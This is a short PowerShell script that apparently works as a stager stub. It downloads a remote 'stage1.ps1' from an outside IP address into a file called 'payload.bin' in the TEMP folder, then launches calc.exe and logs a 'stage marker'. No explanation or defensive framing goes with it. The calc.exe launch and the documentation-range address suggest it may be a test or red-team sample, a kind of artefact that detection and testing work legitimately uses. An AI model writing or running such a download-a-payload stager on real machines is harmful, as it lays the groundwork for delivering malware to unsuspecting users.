
[CmdletBinding()]
param(
    [string]$RemoteUrl = "https://203.0.113.32:443/stage1.ps1",
    [string]$Stage2Path = "$env:TEMP\payload.bin",
    [int]$RequestTimeout = 225
)
Invoke-WebRequest -Uri $RemoteUrl -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Write-Verbose "stage marker 13 reached"
